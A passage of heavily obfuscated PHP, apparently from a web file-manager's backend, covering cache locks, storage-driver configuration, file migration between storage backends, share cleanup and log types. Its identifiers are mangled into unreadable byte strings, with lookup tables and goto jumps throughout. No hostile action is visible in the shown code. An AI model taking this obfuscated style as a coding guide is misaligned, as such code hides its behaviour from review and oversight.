$‡õ¦ğ·” = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($»î¡ç), $‡õ¦ğ·”); Cache::set(self::QUEUE_DATA, $»î¡ç, $‡õ¦ğ·”); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto CÂ¼©œª…‚; Bß©Èâ¾Â: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ö£Ë¦ì— =& $_SERVER[¹Éµ„ºå]; $ê˜ÅÃÃ¦ = $GLOBALS[$ö£Ë¦ì—[6]][$ö£Ë¦ì—[424]]; self::$cachePath = $ê˜ÅÃÃ¦[$ö£Ë¦ì—[230]][$ö£Ë¦ì—[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($óò£Œ—Â, $£µß¼ˆƒ = 0) { $ˆùœš‘… =& $_SERVER[¹Éµ„ºå]; $˜¸Ô¤° = microtime(!0); $úŞ´Ó»Æ = $˜¸Ô¤° + $£µß¼ˆƒ + 0.0001; $º‰¾éì = rtrim(self::$cachePath, $ˆùœš‘…[8]) . $ˆùœš‘…[1012] . md5($óò£Œ—Â) . $ˆùœš‘…[1009]; if (file_exists($º‰¾éì) && filemtime($º‰¾éì) && filemtime($º‰¾éì) < time() - 10) { @unlink($º‰¾éì); } do { if (file_exists($º‰¾éì)) { cacheLockWait(); continue; } $çéñÉå = fopen($º‰¾éì, $ˆùœš‘…[1013]); if (!$çéñÉå) { return !1; } $ŞÛªıã§ = flock($çéñÉå, LOCK_EX | LOCK_NB); self::$caches[$óò£Œ—Â] = array($ˆùœš‘…[1014] => $çéñÉå, $ˆùœš‘…[230] => $º‰¾éì); fwrite($çéñÉå, $úŞ´Ó»Æ); clearstatcache(); if ($çéñÉå && $ŞÛªıã§) { return !0; } cacheLockWait(); } while (microtime(!0) < $úŞ´Ó»Æ); $this->unlock($óò£Œ—Â); return !1; } public function lockGet($ûö­î¥¢) { $½§½õîë =& $_SERVER[¹Éµ„ºå]; $Í‚¯Öò¸ = rtrim(self::$cachePath, $½§½õîë[8]) . $½§½õîë[1012] . md5($ûö­î¥¢) . $½§½õîë[1009]; return file_exists($Í‚¯Öò¸); } public function unlock($İÖöµ©¢) { $ÒªúÖüÑ =& $_SERVER[¹Éµ„ºå]; $îµë œ³ = self::$caches[$İÖöµ©¢]; if (!$îµë œ³) { return; } @flock($îµë œ³[$ÒªúÖüÑ[1014]], LOCK_UN); @fclose($îµë œ³[$ÒªúÖüÑ[1014]]); @unlink($îµë œ³[$ÒªúÖüÑ[230]]); unset(self::$caches[$İÖöµ©¢]); } } class CacheLockRedis { public function lock($Ëé†ıä·, $•ÓéŒª = 10) { $éÀéÌš = Cache::init(); $Öœş‚» = microtime(!0) + $•ÓéŒª; while (microtime(!0) < $Öœş‚») { $‰ñşõöÄ = $éÀéÌš->get($Ëé†ıä·); if (!$‰ñşõöÄ) { $†ÇŒŞˆº = $éÀéÌš->setLock($Ëé†ıä·, $Öœş‚», $•ÓéŒª); if ($†ÇŒŞˆº) { return !0; } } else { if ($‰ñşõöÄ < microtime(!0)) { $éÀéÌš->set($Ëé†ıä·, $Öœş‚», $•ÓéŒª * 2); if ($éÀéÌš->get($Ëé†ıä·) === $‰ñşõöÄ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ï›ŞˆĞœ) { return Cache::init()->get($Ï›ŞˆĞœ); } public function unlock($…‰½é©°) { return Cache::init()->remove($…‰½é©°); } } goto eÑ‹Æ²ÂÂ; e÷ÎŠÜµ¡Å: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x73\164\157\x72\x61\x67\145\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x73\151\x7a\145\x4d\x61\170", "\163\171\163\164\x65\155", "\x64\x65\146\x61\165\x6c\x74", "\x64\x72\x69\166\x65\x72", "\143\x6f\156\146\x69\147"); public function listData($ÙÂ…îı‡ = false, $ùº¸¯™¾ = "\x6d\157\144\x69\146\171\124\151\x6d\145", $­ÜŞ˜³ = false) { $ÃÍİË¿è =& $_SERVER[¹Éµ„ºå]; $ìë±•Üæ = parent::listData($ÙÂ…îı‡, $ùº¸¯™¾, $­ÜŞ˜³); if ($ÙÂ…îı‡) { return $ìë±•Üæ; } $û¶­‚¢ = array(); if ($GLOBALS[$ÃÍİË¿è[2503]]) { $û¶­‚¢ = $this->ioSizeUseGet(array_to_keyvalue($ìë±•Üæ, $ÃÍİË¿è[12], $ÃÍİË¿è[487])); } foreach ($ìë±•Üæ as $ë‡‘ÂêÅ => $åš­¯¬ğ) { unset($ìë±•Üæ[$ë‡‘ÂêÅ][$ÃÍİË¿è[6]]); $ìë±•Üæ[$ë‡‘ÂêÅ][$ÃÍİË¿è[2158]] = isset($û¶­‚¢[$åš­¯¬ğ[$ÃÍİË¿è[487]]]) ? $û¶­‚¢[$åš­¯¬ğ[$ÃÍİË¿è[487]]] : 0; } return $ìë±•Üæ; } public function ioSizeUseGet($ò“–¢ÙÆ) { $Õ‹”â¯ =& $_SERVER[¹Éµ„ºå]; if (!$ò“–¢ÙÆ) { return array(); } $øÛæ“» = $Õ‹”â¯[2504] . implode($Õ‹”â¯[50], $ò“–¢ÙÆ); $Í½¶ä€ş = Cache::get($øÛæ“»); if ($Í½¶ä€ş) { return $Í½¶ä€ş; } $‘ÉÎÁÕ‡ = array($Õ‹”â¯[917] => $Õ‹”â¯[487], $Õ‹”â¯[2505] => $Õ‹”â¯[79]); $ıúº¼¼± = array($Õ‹”â¯[917] => array($Õ‹”â¯[7], $ò“–¢ÙÆ)); $Í½¶ä€ş = Model($Õ‹”â¯[907])->field($‘ÉÎÁÕ‡)->where($ıúº¼¼±)->group($Õ‹”â¯[917])->select(); $Í½¶ä€ş = array_to_keyvalue($Í½¶ä€ş, $Õ‹”â¯[487], $Õ‹”â¯[79]); Cache::set($øÛæ“», $Í½¶ä€ş, 600); return $Í½¶ä€ş; } public function getConfig($•½Œ¢×) { $†ªá¾½Ê = parent::listData($•½Œ¢×); $°öù·š“ = _get($†ªá¾½Ê, $_SERVER[¹Éµ„ºå][6], array()); if ($°öù·š“ && !is_array($°öù·š“)) { $°öù·š“ = json_decode($°öù·š“, !0); } return $°öù·š“; } public function update($’Ğ¢öş“, $ŒÁ‹Ã‹Ó) { $Ò•Û•á =& $_SERVER[¹Éµ„ºå]; $øËÜúª× = $ŒÁ‹Ã‹Ó[$Ò•Û•á[32]]; $Ò€ĞŒ£ = array_to_keyvalue(parent::listData(), $Ò•Û•á[32]); if (isset($Ò€ĞŒ£[$øËÜúª×]) && $Ò€ĞŒ£[$øËÜúª×][$Ò•Û•á[487]] != $’Ğ¢öş“) { return !1; } $this->checkPwd($’Ğ¢öş“, $ŒÁ‹Ã‹Ó); if (isset($ŒÁ‹Ã‹Ó[$Ò•Û•á[2506]]) && $ŒÁ‹Ã‹Ó[$Ò•Û•á[2506]] == $Ò•Û•á[91]) { $this->checkConfig($ŒÁ‹Ã‹Ó); } unset($ŒÁ‹Ã‹Ó[$Ò•Û•á[2506]]); $ÈŒÚªö = parent::update($’Ğ¢öş“, $ŒÁ‹Ã‹Ó); if ($ÈŒÚªö && $ŒÁ‹Ã‹Ó[$Ò•Û•á[37]]) { foreach ($Ò€ĞŒ£ as $äÕï»½¶) { if ($äÕï»½¶[$Ò•Û•á[37]] && $äÕï»½¶[$Ò•Û•á[487]] != $’Ğ¢öş“) { parent::update($äÕï»½¶[$Ò•Û•á[487]], array($Ò•Û•á[37] => 0)); } } $this->updateBackup($’Ğ¢öş“, $Ò€ĞŒ£); } return $ÈŒÚªö; } public function add($‘àßÃ ´) { $ÒêØìŞ =& $_SERVER[¹Éµ„ºå]; $ª»¡¯Ùª = array_to_keyvalue(parent::listData(), $ÒêØìŞ[32]); if (isset($ª»¡¯Ùª[$‘àßÃ ´[$ÒêØìŞ[32]]])) { return !1; } $this->checkConfig($‘àßÃ ´); $¢éŒ×… = parent::insert($‘àßÃ ´); if ($¢éŒ×… && $‘àßÃ ´[$ÒêØìŞ[37]]) { foreach ($ª»¡¯Ùª as $ÜŸ±®ù) { if ($ÜŸ±®ù[$ÒêØìŞ[37]]) { parent::update($ÜŸ±®ù[$ÒêØìŞ[487]], array($ÒêØìŞ[37] => 0)); } } $this->updateBackup($¢éŒ×…, $ª»¡¯Ùª); } return $¢éŒ×…; } public function updateBackup($‚‚óË›, $ÆûóÀö) { $•ˆŒ‡Ùæ =& $_SERVER[¹Éµ„ºå]; $¿ùÖß’Š = Model($•ˆŒ‡Ùæ[864])->get($•ˆŒ‡Ùæ[870]); $¿ùÖß’Š = json_decode($¿ùÖß’Š, !0); if (!$¿ùÖß’Š) { return; } if ($¿ùÖß’Š[$•ˆŒ‡Ùæ[1935]] != $•ˆŒ‡Ùæ[91]) { return; } $¨ñ•¼Şè = $¿ùÖß’Š[$•ˆŒ‡Ùæ[843]]; if ($¿ùÖß’Š[$•ˆŒ‡Ùæ[168]] != $•ˆŒ‡Ùæ[1297]) { if ($¨ñ•¼Şè != $‚‚óË›) { return; } $¿ùÖß’Š[$•ˆŒ‡Ùæ[168]] = $•ˆŒ‡Ùæ[1297]; } else { if ($¨ñ•¼Şè == $‚‚óË›) { return; } $¿ùÖß’Š[$•ˆŒ‡Ùæ[843]] = $‚‚óË›; } Model($•ˆŒ‡Ùæ[864])->set(array($•ˆŒ‡Ùæ[870] => $¿ùÖß’Š)); } public function checkPwd($Ÿõà…¾, &$Å…ûîÆù) { $»ß×ƒùÎ =& $_SERVER[¹Éµ„ºå]; if (empty($Å…ûîÆù[$»ß×ƒùÎ[6]])) { return; } $¸İ¹ùš¾ = $Å…ûîÆù[$»ß×ƒùÎ[6]]; if (!is_array($¸İ¹ùš¾)) { $¸İ¹ùš¾ = json_decode($¸İ¹ùš¾, !0); } $œ€ªûáì = $»ß×ƒùÎ[12]; $Œç½Îä¤ = array($»ß×ƒùÎ[1631], $»ß×ƒùÎ[2507], $»ß×ƒùÎ[1043]); foreach ($Œç½Îä¤ as $áÂË£Õ½) { if (isset($¸İ¹ùš¾[$áÂË£Õ½])) { $œ€ªûáì = $áÂË£Õ½; break; } } if (!$œ€ªûáì) { return; } $±Ò‚µÕ´ = $this->getConfig($Ÿõà…¾); $é‹¯‰ù = $±Ò‚µÕ´[$œ€ªûáì]; $à ›Üò§ = $¸İ¹ùš¾[$œ€ªûáì]; if ($à ›Üò§ == str_repeat($»ß×ƒùÎ[220], strlen($é‹¯‰ù))) { $¸İ¹ùš¾[$œ€ªûáì] = $é‹¯‰ù; $Å…ûîÆù[$»ß×ƒùÎ[6]] = json_encode($¸İ¹ùš¾); } else { if ($à ›Üò§ != $é‹¯‰ù) { $Å…ûîÆù[$»ß×ƒùÎ[2506]] = $»ß×ƒùÎ[91]; } } } public function checkConfig(&$§“÷éÏú, $ÁÎ‡¶«¨ = false) { $¹ĞÛäıé =& $_SERVER[¹Éµ„ºå]; $¨÷™Ûä¼ = strtolower($§“÷éÏú[$¹ĞÛäıé[96]]); $’Üò‰ˆÂ = $§“÷éÏú[$¹ĞÛäıé[6]]; if (!is_array($’Üò‰ˆÂ)) { $’Üò‰ˆÂ = json_decode($’Üò‰ˆÂ, !0); } foreach ($’Üò‰ˆÂ as $ãˆ¯¨ü => $³¿ñØ¦Ã) { if (is_string($³¿ñØ¦Ã)) { $’Üò‰ˆÂ[$ãˆ¯¨ü] = trim($³¿ñØ¦Ã); } } $’Üò‰ˆÂ[$¹ĞÛäıé[2508]] = rand_string(6); $ÌŠ¹Š÷Ú = $GLOBALS[$¹ĞÛäıé[6]][$¹ĞÛäıé[92]][$¹ĞÛäıé[925]]; $‡šÂ ¡» = isset($ÌŠ¹Š÷Ú[$¨÷™Ûä¼]) ? $ÌŠ¹Š÷Ú[$¨÷™Ûä¼] : ucfirst($¨÷™Ûä¼); $şğõÃô× = $¹ĞÛäıé[77] . $‡šÂ ¡»; if (!$‡šÂ ¡» || !class_exists($şğõÃô×)) { if ($ÁÎ‡¶«¨) { return LNG($¹ĞÛäıé[2509]); } write_log(array($¹ĞÛäıé[2510], $§“÷éÏú, get_caller_info()), $¹ĞÛäıé[213]); show_json(LNG($¹ĞÛäıé[2509]), !1, $§“÷éÏú); } $ØŸúĞç² = new $şğõÃô×($’Üò‰ˆÂ); $º÷ˆÇ˜  = rtrim($’Üò‰ˆÂ[$¹ĞÛäıé[1358]], $¹ĞÛäıé[8]) . $¹ĞÛäıé[8]; if (in_array($¨÷™Ûä¼, $ØŸúĞç²->objectDriver)) { try { if (!$ØŸúĞç²->isBucketCors() && !$ØŸúĞç²->setBucketCors()) { $Ùë€°ú = LNG($¹ĞÛäıé[2511]); $Ùë€°ú .= $¹ĞÛäıé[2512] . LNG($¹ĞÛäıé[2513]); } } catch (Exception $îêè°»ø) { $Ùë€°ú = $îêè°»ø->getMessage(); } if (isset($Ùë€°ú)) { return $this->_parseError($Ùë€°ú, $¨÷™Ûä¼, $ÁÎ‡¶«¨); } if ($¨÷™Ûä¼ == $¹ĞÛäıé[68]) { $ïÚ¸½é¾ = $ØŸúĞç²->getBktRegion(); if ($ïÚ¸½é¾ != $’Üò‰ˆÂ[$¹ĞÛäıé[2514]]) { $’Üò‰ˆÂ[$¹ĞÛäıé[2514]] = $ïÚ¸½é¾; $ØŸúĞç²->setRegion($ïÚ¸½é¾); } } } else { if ($¨÷™Ûä¼ == $¹ĞÛäıé[2515]) { if ($ØŸúĞç²->ftpPath) { $ø§÷ö‡• = trim($º÷ˆÇ˜ , $¹ĞÛäıé[8]); if (stripos($ø§÷ö‡•, trim($ØŸúĞç²->ftpPath, $¹ĞÛäıé[8])) !== 0) { $º÷ˆÇ˜  = $ØŸúĞç²->ftpPath . $¹ĞÛäıé[8] . ($ø§÷ö‡• ? $ø§÷ö‡• . $¹ĞÛäıé[8] : $¹ĞÛäıé[12]); } } } } $£˜õ²­¬ = $ØŸúĞç²->getPath($º÷ˆÇ˜  . $¹ĞÛäıé[1362]); try { if ($¨÷™Ûä¼ == $¹ĞÛäıé[106]) { $ØŸúĞç²->mkdir($º÷ˆÇ˜ , REPEAT_SKIP); } $í±ãáçã = $ØŸúĞç²->mkfile($£˜õ²­¬, $¹ĞÛäıé[12], REPEAT_REPLACE); if (!$í±ãáçã) { $Ùë€°ú = LNG($¹ĞÛäıé[2511]); } } catch (Exception $îêè°»ø) { $Ùë€°ú = $îêè°»ø->getMessage(); } if (isset($Ùë€°ú)) { return $this->_parseError($Ùë€°ú, $¨÷™Ûä¼, $ÁÎ‡¶«¨); } $’Üò‰ˆÂ[$¹ĞÛäıé[1358]] = $º÷ˆÇ˜ ; $§“÷éÏú[$¹ĞÛäıé[6]] = json_encode($’Üò‰ˆÂ); $§“÷éÏú[$¹ĞÛäıé[96]] = $‡šÂ ¡»; return !0; } private function _parseError($òÍâœıÌ, $ˆ¬¨àÊí, $²ş¨¢Î… = false) { $Å°§éæ” =& $_SERVER[¹Éµ„ºå]; if ($ˆ¬¨àÊí == $Å°§éæ”[68] && stripos($òÍâœıÌ, $Å°§éæ”[2516])) { $İÇ¾Ï³ì = explode($Å°§éæ”[10], $òÍâœıÌ); $ïèîŒ = isset($İÇ¾Ï³ì[1]) ? $İÇ¾Ï³ì[1] : $Å°§éæ”[12]; $ÒÈ–ìÙ = array($Å°§éæ”[2517] => LNG($Å°§éæ”[2518]), $Å°§éæ”[2519] => LNG($Å°§éæ”[2520])); if (isset($ÒÈ–ìÙ[$ïèîŒ])) { $òÍâœıÌ = $ÒÈ–ìÙ[$ïèîŒ]; } } if (stripos($òÍâœıÌ, $Å°§éæ”[2521]) === 0) { $ù†æ‡¯ò = strpos($òÍâœıÌ, $Å°§éæ”[175]); if ($ù†æ‡¯ò === !1) { $ù†æ‡¯ò = strpos($òÍâœıÌ, $Å°§éæ”[4]); } if ($ù†æ‡¯ò !== !1) { $òÍâœıÌ = substr($òÍâœıÌ, $ù†æ‡¯ò + 1); } } $òÍâœıÌ = LNG($Å°§éæ”[1365]) . $òÍâœıÌ; if ($²ş¨¢Î…) { return $òÍâœıÌ; } show_json($òÍâœıÌ, !1); } public function driverListSystem() { $ãÊ©ñ” =& $_SERVER[¹Éµ„ºå]; $ïæ­‘³€ = parent::listData(); $Á‚¸¾âÏ = array(); foreach ($ïæ­‘³€ as $ËùĞÎìò) { unset($ËùĞÎìò[$ãÊ©ñ”[231]], $ËùĞÎìò[$ãÊ©ñ”[88]]); if (!is_array($ËùĞÎìò[$ãÊ©ñ”[6]])) { $ËùĞÎìò[$ãÊ©ñ”[6]] = json_decode($ËùĞÎìò[$ãÊ©ñ”[6]], !0); } $Á‚¸¾âÏ[] = $ËùĞÎìò; } return $Á‚¸¾âÏ; } public function defaultDriver() { $É¤ğü¨½ =& $_SERVER[¹Éµ„ºå]; $ë¡ƒÀ—ˆ = parent::listData(); $’Ç‘¥şÕ = array_filter_by_field($ë¡ƒÀ—ˆ, $É¤ğü¨½[37], 1); $’Ç‘¥şÕ = $’Ç‘¥şÕ[0]; if (!$’Ç‘¥şÕ) { return array(); } if (!is_array($’Ç‘¥şÕ[$É¤ğü¨½[6]])) { $’Ç‘¥şÕ[$É¤ğü¨½[6]] = json_decode($’Ç‘¥şÕ[$É¤ğü¨½[6]], !0); } return $’Ç‘¥şÕ; } public function driverInfo($ñºØãé) { $‚ı¬—Ù¶ =& $_SERVER[¹Éµ„ºå]; $Š’É•ô– = array_to_keyvalue(parent::listData(), $‚ı¬—Ù¶[487]); if (!isset($Š’É•ô–[$ñºØãé])) { return !1; } $÷¨ôÂå = $Š’É•ô–[$ñºØãé]; if (!is_array($÷¨ôÂå[$‚ı¬—Ù¶[6]])) { $÷¨ôÂå[$‚ı¬—Ù¶[6]] = json_decode($÷¨ôÂå[$‚ı¬—Ù¶[6]], !0); } return $÷¨ôÂå; } public function remove($ñàïåÙê) { $this->removeShareItems($ñàïåÙê); return parent::remove($ñàïåÙê); } public function removeWithFile($’¢ç•î±, $İÒáó‚‰, $ÑéÏ‘ê, $¦ŠØæ = false) { $¥ş¤ü´Ô =& $_SERVER[¹Éµ„ºå]; ignore_timeout(); $Öáô˜¯¾ = array($¥ş¤ü´Ô[917] => $’¢ç•î±); $ßÛªä±µ = Model($¥ş¤ü´Ô[560]); if (isset($GLOBALS[$¥ş¤ü´Ô[2522]])) { $µõ…Òôê = $GLOBALS[$¥ş¤ü´Ô[2522]]; } else { $µõ…Òôê = $ßÛªä±µ->where($Öáô˜¯¾)->field(array($¥ş¤ü´Ô[940] => $¥ş¤ü´Ô[941], $¥ş¤ü´Ô[942] => $¥ş¤ü´Ô[79]))->find(); } $®ÏÇı°× = intval($µõ…Òôê[$¥ş¤ü´Ô[941]]); $ØËÁØÑ = intval($µõ…Òôê[$¥ş¤ü´Ô[79]]); $³Œ¨Şƒ‚ = $İÒáó‚‰ . $¥ş¤ü´Ô[2523] . $’¢ç•î±; $Ù‚š³ğú = LNG($İÒáó‚‰ == $¥ş¤ü´Ô[643] ? $¥ş¤ü´Ô[2524] : $¥ş¤ü´Ô[2525]); $ò°µÀ = new TaskFileTransfer($³Œ¨Şƒ‚, $¥ş¤ü´Ô[213], $®ÏÇı°×, $Ù‚š³ğú . $¥ş¤ü´Ô[476] . $ÑéÏ‘ê[$¥ş¤ü´Ô[32]] . $¥ş¤ü´Ô[212] . $’¢ç•î±); $ò°µÀ->task[$¥ş¤ü´Ô[855]] = (double) $ØËÁØÑ; $úãêâş‘ = KodIO::defaultDriver(); $ÏàŞ°ôë = $úãêâş‘[$¥ş¤ü´Ô[487]]; $Øùª­Ì’ = 1; $İâã¾£ = 5000; $«í†©‹¶ = $„Ù€œÕÔ = $£µ¿»ôĞ = array(); $¬Û£¦ì = $ßÛªä±µ->where($Öáô˜¯¾)->field($¥ş¤ü´Ô[2526])->selectPage($İâã¾£, $Øùª­Ì’); $ãØ‰Œê  = intval($¬Û£¦ì[$¥ş¤ü´Ô[443]][$¥ş¤ü´Ô[445]]); while ($¬Û£¦ì && $Øùª­Ì’ <= $ãØ‰Œê ) { foreach ($¬Û£¦ì[$¥ş¤ü´Ô[446]] as $èŸ«ÉÈÂ) { $¬ı†˜éå = $èŸ«ÉÈÂ[$¥ş¤ü´Ô[557]]; if ($¦ŠØæ) { $„Ù€œÕÔ[] = $¬ı†˜éå; continue; } $ş¯à¦êˆ = $èŸ«ÉÈÂ[$¥ş¤ü´Ô[87]]; $¨¨µã¡ = rtrim(get_path_father($ş¯à¦êˆ), $¥ş¤ü´Ô[8]) . $¥ş¤ü´Ô[8]; $£µ¿»ôĞ[] = $¨¨µã¡; $¨¨µã¡ = str_replace("\x7b\x69\157\72{$’¢ç•î±}\175\x2f", "\173\151\x6f\x3a{$ÏàŞ°ôë}\x7d\x2f", $¨¨µã¡); if (!IO::exist($ş¯à¦êˆ) || !IO::isFile($ş¯à¦êˆ)) { $«í†©‹¶[] = $¬ı†˜éå; $ò°µÀ->updateFileEnd($èŸ«ÉÈÂ[$¥ş¤ü´Ô[32]], $èŸ«ÉÈÂ[$¥ş¤ü´Ô[79]]); write_log($¥ş¤ü´Ô[2527] . $ş¯à¦êˆ, $¥ş¤ü´Ô[2105]); continue; } $éøÌÈ¼® = IO::move($ş¯à¦êˆ, $¨¨µã¡, REPEAT_RENAME); if (!$éøÌÈ¼®) { $„Ù€œÕÔ[] = $¬ı†˜éå; $ò°µÀ->updateFileEnd($èŸ«ÉÈÂ[$¥ş¤ü´Ô[32]], $èŸ«ÉÈÂ[$¥ş¤ü´Ô[79]]); write_log($¥ş¤ü´Ô[2528] . $ş¯à¦êˆ, $¥ş¤ü´Ô[2105]); continue; } $š™ÆÒ = array($¥ş¤ü´Ô[917] => $ÏàŞ°ôë, $¥ş¤ü´Ô[87] => $éøÌÈ¼®); $ßÛªä±µ->where(array($¥ş¤ü´Ô[557] => $¬ı†˜éå))->save($š™ÆÒ); } $Øùª­Ì’++; $¬Û£¦ì = $ßÛªä±µ->where($Öáô˜¯¾)->field($¥ş¤ü´Ô[2526])->selectPage($İâã¾£, $Øùª­Ì’); } $ÛÒê¥¨« = $ò°µÀ->task; if (!$¦ŠØæ) { Cache::set($³Œ¨Şƒ‚, $ÛÒê¥¨«); } $ò°µÀ->end(); $«í†©‹¶ = array_unique($«í†©‹¶); $„Ù€œÕÔ = array_unique($„Ù€œÕÔ); if (!$¦ŠØæ && ($«í†©‹¶ || $„Ù€œÕÔ)) { $²†§÷§ = array(); if ($«í†©‹¶) { $²†§÷§[] = sprintf(LNG($¥ş¤ü´Ô[2529]), count($«í†©‹¶)); } if ($„Ù€œÕÔ) { $²†§÷§[] = sprintf(LNG($¥ş¤ü´Ô[2530]), count($„Ù€œÕÔ)); } $²†§÷§ = sprintf(LNG($¥ş¤ü´Ô[2531]), implode($¥ş¤ü´Ô[1576], $²†§÷§)) . $¥ş¤ü´Ô[2532] . date($¥ş¤ü´Ô[2533]) . $¥ş¤ü´Ô[2534]; if ($İÒáó‚‰ == $¥ş¤ü´Ô[1323]) { $²†§÷§ .= $¥ş¤ü´Ô[2535] . LNG($¥ş¤ü´Ô[2536]); } else { $²†§÷§ = LNG($¥ş¤ü´Ô[2537]) . $¥ş¤ü´Ô[2538] . $²†§÷§; } $ÛÒê¥¨«[$¥ş¤ü´Ô[1360]] = $²†§÷§; Cache::set($³Œ¨Şƒ‚, $ÛÒê¥¨«); unset($ÑéÏ‘ê[$¥ş¤ü´Ô[6]]); $ÓŒÑ„ = array($¥ş¤ü´Ô[487] => $’¢ç•î±, $¥ş¤ü´Ô[2412] => $¥ş¤ü´Ô[643], $¥ş¤ü´Ô[32] => $ÑéÏ‘ê[$¥ş¤ü´Ô[32]], $¥ş¤ü´Ô[96] => $ÑéÏ‘ê[$¥ş¤ü´Ô[96]]); Hook::trigger($¥ş¤ü´Ô[1975], array($¥ş¤ü´Ô[1381] => $ÓŒÑ„, $¥ş¤ü´Ô[1391] => !0)); show_json($²†§÷§, !1, 100111); } if ($İÒáó‚‰ == $¥ş¤ü´Ô[643]) { return !0; } if ($«í†©‹¶ || $„Ù€œÕÔ) { $òş›ÈøÄ = array_merge($«í†©‹¶, $„Ù€œÕÔ); $òş›ÈøÄ = array_filter(array_unique($òş›ÈøÄ)); $this->removeByFileID($òş›ÈøÄ); } if ($£µ¿»ôĞ) { $£µ¿»ôĞ = array_filter(array_unique($£µ¿»ôĞ)); foreach ($£µ¿»ôĞ as $ş¯à¦êˆ) { $µõ…Òôê = IO::has($ş¯à¦êˆ, !0); if (!$µõ…Òôê[$¥ş¤ü´Ô[239]] && !$µõ…Òôê[$¥ş¤ü´Ô[240]]) { IO::remove($ş¯à¦êˆ); } } } return $this->remove($’¢ç•î±); } private function removeByFileID($Ø‚È¼ğô = array()) { $øÈ´ï…« =& $_SERVER[¹Éµ„ºå]; if (empty($Ø‚È¼ğô)) { return; } $ÍÄ‡Èâã = array($øÈ´ï…«[557] => array($øÈ´ï…«[7], $Ø‚È¼ğô)); $…ÂÏÈÊ = Model($øÈ´ï…«[1523])->where($ÍÄ‡Èâã)->field($øÈ´ï…«[2485])->select(); if (!$…ÂÏÈÊ) { return Model($øÈ´ï…«[560])->remove($Ø‚È¼ğô); } $…ÂÏÈÊ = array_to_keyvalue($…ÂÏÈÊ, $øÈ´ï…«[191], $øÈ´ï…«[557]); foreach ($…ÂÏÈÊ as $ŒÖ¾“ğ => $ÍÏé·ÌÊ) { Model($øÈ´ï…«[924])->removeNow($ŒÖ¾“ğ, !1); } $—’¹ëÊÔ = array_diff($Ø‚È¼ğô, array_unique(array_values($…ÂÏÈÊ))); if ($—’¹ëÊÔ) { return Model($øÈ´ï…«[560])->remove($—’¹ëÊÔ); } } private function removeShareItems($…³ûˆ³ó) { $®ÕÂ€é =& $_SERVER[¹Éµ„ºå]; $é°¸¨±á = "\173\x69\x6f\72{$…³ûˆ³ó}\175\57"; $×Ê¤ñî§ = array($®ÕÂ€é[191] => 0, $®ÕÂ€é[583] => array($®ÕÂ€é[473], "{$é°¸¨±á}\x25")); $¨ù•åü¡ = Model($®ÕÂ€é[1552])->where($×Ê¤ñî§)->field($®ÕÂ€é[687])->select(); if (empty($¨ù•åü¡)) { return; } $ÜƒÚÔ = array_to_keyvalue($¨ù•åü¡, $®ÕÂ€é[12], $®ÕÂ€é[687]); Model($®ÕÂ€é[686])->remove($ÜƒÚÔ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\114\x69\x67\x68\x74\101\x70\x70"; public $modelType = "\x53\x79\163\164\x65\x6d\117\x70\164\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\147\x72\x6f\x75\160", "\144\x65\x73\x63", "\x63\x6f\156\x74\145\x6e\164"); public function listData($”á—âç = false, $Í†í®Ø• = "\x6d\157\144\x69\x66\171\124\x69\155\x65", $ÛëËƒ = true) { return parent::listData($”á—âç, $Í†í®Ø•, $ÛëËƒ); } public function remove($İÀ…º) { $ö™…íû = $this->findByName($İÀ…º); if (!$ö™…íû) { return !1; } return parent::remove($ö™…íû[$_SERVER[¹Éµ„ºå][487]]); } public function add($Â÷Ò¡ğ§) { if ($this->findByName($Â÷Ò¡ğ§[$_SERVER[¹Éµ„ºå][32]])) { return !1; } return parent::insert($Â÷Ò¡ğ§); } public function update($Öå¼½´, $¿±£¿Åƒ) { $ëú­Ã¯Ë =& $_SERVER[¹Éµ„ºå]; $‚Ò‘“Ûß = $this->findByName($Öå¼½´); $£ÏÅ†‡ = $this->findByName($¿±£¿Åƒ[$ëú­Ã¯Ë[32]]); if (!$‚Ò‘“Ûß || $£ÏÅ†‡ && $£ÏÅ†‡[$ëú­Ã¯Ë[487]] != $‚Ò‘“Ûß[$ëú­Ã¯Ë[487]]) { return !1; } return parent::update($‚Ò‘“Ûß[$ëú­Ã¯Ë[487]], $¿±£¿Åƒ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\x69\155\x65", "\164\x69\155\x65", "\151\x6e\163\145\162\164", "\146\165\x6e\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ËÔ¥şì’ =& $_SERVER[¹Éµ„ºå]; return array($ËÔ¥şì’[2539] => LNG($ËÔ¥şì’[2540]), $ËÔ¥şì’[2541] => LNG($ËÔ¥şì’[2542]), $ËÔ¥şì’[2116] => LNG($ËÔ¥şì’[2543]), $ËÔ¥şì’[2544] => LNG($ËÔ¥şì’[2545]), $ËÔ¥şì’[2546] => LNG($ËÔ¥şì’[2547]), $ËÔ¥şì’[2548] => LNG($ËÔ¥şì’[2549]), $ËÔ¥şì’[2550] => LNG($ËÔ¥şì’[2551]), $ËÔ¥şì’[2143] => LNG($ËÔ¥şì’[2551]), $ËÔ¥şì’[2144] => LNG($ËÔ¥şì’[2552]), $ËÔ¥şì’[2553] => LNG($ËÔ¥şì’[2554]), $ËÔ¥şì’[2555] => LNG($ËÔ¥şì’[2556]), $ËÔ¥şì’[2557] => LNG($ËÔ¥şì’[2558]), $ËÔ¥şì’[2559] => LNG($ËÔ¥şì’[2560]), $ËÔ¥şì’[2141] => LNG($ËÔ¥şì’[2561]), $ËÔ¥şì’[2562] => LNG($ËÔ¥şì’[2563]), $ËÔ¥şì’[2148] => LNG($ËÔ¥şì’[2564]), $ËÔ¥şì’[2565] => LNG($ËÔ¥şì’[2566]), $ËÔ¥şì’[2567] => LNG($ËÔ¥şì’[2568]), 